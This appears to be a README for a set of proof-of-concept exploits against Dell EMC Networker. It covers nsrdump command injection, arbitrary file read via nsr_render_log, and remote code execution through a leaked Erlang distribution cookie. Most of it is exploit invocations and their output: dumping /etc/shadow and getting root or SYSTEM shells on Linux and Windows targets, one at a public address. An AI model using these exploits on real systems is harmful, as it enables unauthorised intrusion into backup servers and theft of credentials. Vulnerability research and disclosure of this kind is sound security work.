# Dell EMC Networker PoCs

### emc_networker_rce.rb

Metasploit module to gain remote command execution via arbitrary command injection in nsrdump.

### emc_networker_file_read.py

Arbitrary file read with nsr_render_log, affects all versions and any kind of Dell EMC Networker

```
python3 emc_networker_read.py 192.168.121.238 /etc/shadow
root:$m.REDACTED.::0:99999:7:::
bin:*:18353:0:99999:7:::
daemon:*:18353:0:99999:7:::
adm:*:18353:0:99999:7:::
lp:*:18353:0:99999:7:::
sync:*:18353:0:99999:7:::
shutdown:*:18353:0:99999:7:::
halt:*:18353:0:99999:7:::
mail:*:18353:0:99999:7:::
operator:*:18353:0:99999:7:::
games:*:18353:0:99999:7:::
ftp:*:18353:0:99999:7:::
nobody:*:18353:0:99999:7:::
systemd-network:!!:18382::::::
dbus:!!:18382::::::
polkitd:!!:18382::::::
rpc:!!:18382:0:99999:7:::
tss:!!:18382::::::
rpcuser:!!:18382::::::
nfsnobody:!!:18382::::::
sshd:!!:18382::::::
postfix:!!:18382::::::
chrony:!!:18382::::::
vagrant:$gREDACTED.::0:99999:7:::
nsrtomcat:!!:18599:0:99999:7:::
```

```
python3 emc_networker_read.py 192.168.121.183 C:\\Windows\\System32\\drivers\\etc\\hosts  
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host
# localhost name resolution is handled within DNS itself.
#   127.0.0.1       localhost
#   ::1             localhost
```



### emc_networker_rce_nsrdump.py

Command injection in nsrdump affecting Dell EMC Networker Server.

### emc_networker_rce_erlang.py

Combination of arbitrary file read and exposed Erlang distribution server to gain RCE on Dell EMC Networker Server.

```
python3 emc_networker_rce.py 52.86.24.194
[+] Target seems to be Linux
[+] Target is running EMC Networker 19.4.0.0.Build.25
[+] Leaked Erlang distribution cookie through path traversal.
[+] Cookie value: ZMrEonllvEw6EGq9avSxG2rg3aHexkZx
[+] Got Erlang distribution port for service (rabbit) on port 25672
[*] authenticated onto victim
52.86.24.194:25672 $ id
uid=0(root) gid=0(root) groups=0(root)
52.86.24.194:25672 $ uname -avr
Linux ip-172-31-50-5.ec2.internal 4.12.14-122.37-default #1 SMP Sun Sep 6 05:00:36 UTC 2020 (fe8cacf) x86_64 x86_64 x86_64 GNU/Linux
52.86.24.194:25672 $ ^C
[*] disconnecting from victim
```


```
python3 emc_networker_rce.py 192.168.121.238
[+] Target seems to be Linux
[+] Target is running EMC Networker 9.1.0.2.Build.43
[+] Leaked Erlang distribution cookie through path traversal.
[+] Cookie value: XXEKXJXWOSTUZKOFMHJG
[+] Got Erlang distribution port for service (rabbit) on port 42861
[*] authenticated onto victim
192.168.121.238:42861 $ id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
192.168.121.238:42861 $
[*] disconnecting from victim
```

PoC run against Dell EMC Networker Server on Windows:

```
python3 emc_networker_rce.py 192.168.121.183
[+] Target seems to be Windows
[+] Target is running EMC Networker 9.1.0.2.Build.43
[+] Leaked Erlang distribution cookie through path traversal.
[+] Cookie value: JFBODSOEGHDUTBYQTYYZ
[+] Got Erlang distribution port for service (rabbit) on port 57399
[*] authenticated onto victim
192.168.121.183:57399 $ whoami
nt authority\system
192.168.121.183:57399 $

[*] disconnecting from victim
```

